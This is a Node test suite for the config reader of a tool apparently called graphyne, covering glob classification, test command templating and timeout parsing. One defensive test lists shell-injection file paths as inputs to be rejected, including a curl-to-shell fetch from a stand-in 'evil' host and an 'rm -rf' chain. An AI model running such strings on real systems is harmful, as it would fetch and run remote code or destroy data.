import { test } from "node:test";
import assert from "node:assert/strict";
import { writeFileSync } from "node:fs";
import { join } from "node:path";

import { withTempRoot } from "../helpers.mts";
import {
  readConfig,
  isGatedSource,
  isTestFile,
  isDocFile,
  isIgnored,
  needsMeta,
  testFileCommand,
  testAllCommand,
  DEFAULT_CONFIG,
} from "../../../plugins/graphyne/common/config.mjs";

const SAMPLE = {
  name: "Demo",
  source: ["src/**/*.ts"],
  exclude: ["**/*.test.ts", "**/*.d.ts"],
  tests: ["**/*.test.ts"],
  metaExclude: ["**/*.md"],
  docs: ["README.md", "docs/**/*.md"],
  specs: ["spec/**/*.md", "**/*.spec.md"],
  ignore: ["vendor/**"],
  test: { file: "npm test -- {test}", all: "npm test" },
};

function writeConfig(root: string, obj: unknown): void {
  writeFileSync(join(root, "graphyne.json"), JSON.stringify(obj));
}

test("missing config -> safe defaults", () => {
  withTempRoot((root) => {
    assert.deepEqual(readConfig(root), { ...DEFAULT_CONFIG });
  });
});

test("malformed config -> defaults, no throw", () => {
  withTempRoot((root) => {
    writeFileSync(join(root, "graphyne.json"), "{ not json");
    assert.deepEqual(readConfig(root), { ...DEFAULT_CONFIG });
  });
});

test("isGatedSource respects source/exclude and store exemption", () => {
  withTempRoot((root) => {
    writeConfig(root, SAMPLE);
    const c = readConfig(root);
    assert.equal(isGatedSource(c, "src/foo.ts"), true);
    assert.equal(isGatedSource(c, "src/foo.test.ts"), false); // excluded
    assert.equal(isGatedSource(c, "src/foo.d.ts"), false); // excluded
    assert.equal(isGatedSource(c, "README.md"), false); // not source
    assert.equal(isGatedSource(c, ".graphyne/meta/x.yaml"), false); // store
    assert.equal(isGatedSource(c, "graphyne.json"), false); // config
  });
});

test("isTestFile matches tests globs", () => {
  withTempRoot((root) => {
    writeConfig(root, SAMPLE);
    const c = readConfig(root);
    assert.equal(isTestFile(c, "src/foo.test.ts"), true);
    assert.equal(isTestFile(c, "src/foo.ts"), false);
  });
});

test("needsMeta excludes store/config and metaExclude", () => {
  withTempRoot((root) => {
    writeConfig(root, SAMPLE);
    const c = readConfig(root);
    assert.equal(needsMeta(c, "src/foo.ts"), true);
    assert.equal(needsMeta(c, "CHANGELOG.md"), false); // metaExclude, not a doc/spec
    assert.equal(needsMeta(c, ".graphyne/x"), false);
    assert.equal(needsMeta(c, "graphyne.json"), false);
  });
});

test("readConfig parses docs/specs globs (default empty)", () => {
  withTempRoot((root) => {
    writeConfig(root, SAMPLE);
    const c = readConfig(root);
    assert.deepEqual(c.docs, ["README.md", "docs/**/*.md"]);
    assert.deepEqual(c.specs, ["spec/**/*.md", "**/*.spec.md"]);
    assert.deepEqual(c.ignore, ["vendor/**"]);
    assert.deepEqual(DEFAULT_CONFIG.docs, []);
    assert.deepEqual(DEFAULT_CONFIG.specs, []);
    assert.deepEqual(DEFAULT_CONFIG.ignore, []);
  });
});

test("isDocFile matches its globs, exempt store/config", () => {
  withTempRoot((root) => {
    writeConfig(root, SAMPLE);
    const c = readConfig(root);
    assert.equal(isDocFile(c, "README.md"), true); // root-level doc, matched natively
    assert.equal(isDocFile(c, "docs/guide.md"), true);
    assert.equal(isDocFile(c, "auth.spec.md"), false); // that's a spec
    assert.equal(isDocFile(c, "graphyne.json"), false); // config exempt
    assert.equal(isDocFile(c, ".graphyne/meta/x.yaml"), false); // store exempt
  });
});

test("doc/spec files are never gated, even if they also match source", () => {
  withTempRoot((root) => {
    writeConfig(root, { ...SAMPLE, source: ["**/*.md"] });
    const c = readConfig(root);
    assert.equal(isGatedSource(c, "README.md"), false); // doc class wins over source
    assert.equal(isGatedSource(c, "auth.spec.md"), false); // spec class wins over source
    assert.equal(isGatedSource(c, "OTHER.md"), true); // plain .md in source -> gated
  });
});

test("doc/spec files require meta, overriding metaExclude", () => {
  withTempRoot((root) => {
    writeConfig(root, SAMPLE);
    const c = readConfig(root);
    assert.equal(needsMeta(c, "README.md"), true); // doc, despite **/*.md in metaExclude
    assert.equal(needsMeta(c, "docs/guide.md"), true);
    assert.equal(needsMeta(c, "auth.spec.md"), true); // spec
  });
});

test("ignore is a FULL exemption: not gated, not doc/spec, no meta (kills the asymmetry)", () => {
  withTempRoot((root) => {
    writeConfig(root, {
      ...SAMPLE,
      source: ["**/*.md", "src/**/*.ts"],
      docs: ["**/*.md"],
      metaExclude: [], // deliberately empty: only `ignore` can exempt now
      ignore: ["node_modules/**", ".memosyne/**", "src/plugin/**"],
    });
    const c = readConfig(root);

    assert.equal(isIgnored(c, "node_modules/x/readme.md"), true);
    assert.equal(isIgnored(c, ".graphyne/meta/x.yaml"), true); // built-in store still ignored
    assert.equal(isIgnored(c, "README.md"), false);

    // full exemption across every axis
    assert.equal(isGatedSource(c, "src/plugin/x.ts"), false); // ignored -> not gated
    assert.equal(isDocFile(c, "node_modules/x/readme.md"), false); // ignored -> not a doc
    assert.equal(needsMeta(c, ".memosyne/t/task.md"), false); // ignored -> no meta
    assert.equal(needsMeta(c, "node_modules/x/index.js"), false); // ignored non-.md, no metaExclude -> still no meta (the fix)

    // a normal doc is unaffected
    assert.equal(isDocFile(c, "README.md"), true);
    assert.equal(needsMeta(c, "README.md"), true);
  });
});

test("exclude is gate-only: it does NOT carve doc/spec classification", () => {
  withTempRoot((root) => {
    writeConfig(root, {
      ...SAMPLE,
      docs: ["**/*.md"],
      exclude: ["src/svc.ts", "README.md"], // README in exclude must NOT stop it being a doc
      ignore: [],
    });
    const c = readConfig(root);
    assert.equal(isGatedSource(c, "src/svc.ts"), false); // excluded from the gate
    assert.equal(needsMeta(c, "src/svc.ts"), true); // ...but still tracked (needs meta)
    assert.equal(isDocFile(c, "README.md"), true); // exclude no longer carves docs
    assert.equal(needsMeta(c, "README.md"), true);
  });
});

test("test command templating", () => {
  withTempRoot((root) => {
    writeConfig(root, SAMPLE);
    const c = readConfig(root);
    assert.equal(testFileCommand(c, "test/a.test.ts"), "npm test -- test/a.test.ts");
    assert.equal(testAllCommand(c), "npm test");
    assert.equal(testFileCommand({ ...DEFAULT_CONFIG }, "x"), null);
  });
});

test("testFileCommand substitutes every {test} occurrence for a safe path", () => {
  withTempRoot((root) => {
    writeConfig(root, { ...SAMPLE, test: { file: "node --test {test} --reporter {test}", all: "npm test" } });
    const c = readConfig(root);
    assert.equal(testFileCommand(c, "src/x.test.ts"), "node --test src/x.test.ts --reporter src/x.test.ts");
  });
});

test("testFileCommand throws on shell-injection paths, before substitution (command injection guard)", () => {
  withTempRoot((root) => {
    writeConfig(root, SAMPLE);
    const c = readConfig(root);
    for (const bad of [
      "x; touch pwned",
      "$(curl http://evil|sh).test.ts",
      "`id`.test.ts",
      "a && rm -rf x",
      "a | sh",
      "a b.test.ts",
      "a\nb.test.ts",
    ]) {
      assert.throws(() => testFileCommand(c, bad), /unsafe|inject|metacharacter/i, `should reject: ${JSON.stringify(bad)}`);
    }
    // A legitimate shell-featured template still works for a safe path.
    writeConfig(root, { ...SAMPLE, test: { file: "NODE_ENV=test node --test {test} 2>&1", all: "npm test" } });
    const c2 = readConfig(root);
    assert.equal(testFileCommand(c2, "src/x.test.ts"), "NODE_ENV=test node --test src/x.test.ts 2>&1");
  });
});

test("test.timeoutMs: a positive finite number is parsed; absent/malformed reads as undefined", () => {
  withTempRoot((root) => {
    writeConfig(root, { ...SAMPLE, test: { ...SAMPLE.test, timeoutMs: 1234 } });
    assert.equal(readConfig(root).test.timeoutMs, 1234);

    writeConfig(root, SAMPLE); // absent — the runner applies its own default
    assert.equal(readConfig(root).test.timeoutMs, undefined);

    for (const bad of ["500", -1, 0, 1234.5, true, {}, null]) {
      writeConfig(root, { ...SAMPLE, test: { ...SAMPLE.test, timeoutMs: bad } });
      assert.equal(readConfig(root).test.timeoutMs, undefined, `rejects ${JSON.stringify(bad)}`);
    }
  });
});
